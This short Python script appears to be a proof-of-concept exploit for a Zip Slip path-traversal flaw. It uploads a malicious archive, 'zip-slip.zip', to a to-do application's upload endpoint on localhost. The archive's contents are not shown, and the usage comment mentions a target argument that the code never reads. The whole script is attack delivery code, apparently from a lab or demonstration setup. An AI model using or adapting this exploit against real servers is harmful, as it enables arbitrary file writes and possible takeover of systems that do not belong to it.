#! /usr/bin/env python

# to run: `python zip-slip.py http://SERVER-IP:SERVER-PORT`

import requests
import os
import sys

malicious_zip = os.path.join(os.path.dirname(__file__), 'zip-slip.zip')
url = 'http://localhost:8080' + '/todo/upload.do.action'
with open(malicious_zip, 'rb') as f:
    files = {'upload': ('zip-slip.zip', f, 'application/zip')}

    requests.post(url, files=files)
